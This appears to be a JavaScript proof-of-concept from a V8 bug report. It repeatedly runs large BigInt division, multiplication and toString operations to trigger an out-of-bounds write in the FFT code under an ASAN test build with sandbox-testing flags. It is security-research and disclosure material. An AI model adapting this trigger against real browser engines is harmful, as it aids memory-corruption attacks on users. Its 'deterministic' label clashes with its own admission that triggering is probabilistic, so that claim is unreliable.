// V8 Sandbox Escape PoC - DETERMINISTIC variant (Issue 478814654)
// ==============================================================================
//
// This PoC uses a different approach to ensure the OOB carry is triggered
// more reliably. Instead of relying on the random CopyAndZeroExtend corruption,
// it triggers BigInt operations repeatedly until the OOB write is detected.
//
// The key insight: the CopyAndZeroExtend corruption is probabilistic (~10% per
// digit). By performing MANY BigInt operations that go through FFT, we maximize
// the probability that at least one operation triggers the OOB write.
//
// Build:
//   is_asan = true
//   v8_enable_sandbox = true
//   v8_enable_memory_corruption_api = true
//   v8_advanced_bigint_algorithms = true
//
// Run:
//   ./d8 --sandbox-testing poc_sandbox_violation_deterministic.js
//
// Expected:
//   ## V8 sandbox violation detected!

// FFT threshold: kFftThreshold = 720 digits (~46080 bits on 64-bit)
// We use values well above this threshold to ensure FFT is used.

function triggerDivisionOOB() {
  // Use different exponents to get different FFT sizes
  // This increases the probability of hitting the OOB condition
  const bases = [31337n, 99991n, 65537n, 123456n, 999999n];
  const divisors = [42n, 7n, 13n, 37n, 97n];

  for (let i = 0; i < bases.length; i++) {
    for (let j = 0; j < divisors.length; j++) {
      try {
        const x = bases[i] ** 123456n;
        const y = divisors[j] ** 123456n;
        // Division triggers: DivideBurnikelZiegler -> D2n1n -> D3n2n -> Multiply -> MultiplyFFT
        const result = x / y;
      } catch (e) {
        // OOB write may cause crash before we can catch it
        // With ASAN, the crash is caught by the signal handler
      }
    }
  }
}

function triggerToStringOOB() {
  // BigInt.toString also calls MultiplyFFT via FromStringLarge path
  // This is the path from the original 474041332 issue
  const x = 31337n ** 123456n;
  try {
    // toString with radix 16 calls IntoLargeDigits which may use FFT
    const s = x.toString(16);
  } catch (e) {
    // Expected to crash with ASAN before catching
  }
}

function triggerMultiplyOOB() {
  // Direct large multiplication also triggers FFT
  const a = (2n ** 46080n) - 1n;  // Just above FFT threshold
  const b = (2n ** 46080n) - 1n;
  try {
    const c = a * b;
  } catch (e) {
    // Expected to crash with ASAN
  }
}

// Run all trigger paths
// With v5 instrumentation (CopyAndZeroExtend corruption + new digit_t[] allocator),
// the OOB write is detected by ASAN, which reports it as a sandbox violation.
print("Triggering BigInt division OOB...");
triggerDivisionOOB();

print("Triggering BigInt toString OOB...");
triggerToStringOOB();

print("Triggering BigInt multiplication OOB...");
triggerMultiplyOOB();

print("All operations completed without sandbox violation.");
print("This means the probabilistic corruption didn't trigger OOB in this run.");
print("Try running again - the corruption is ~10% per digit, so it should");
print("eventually trigger within a few runs.");
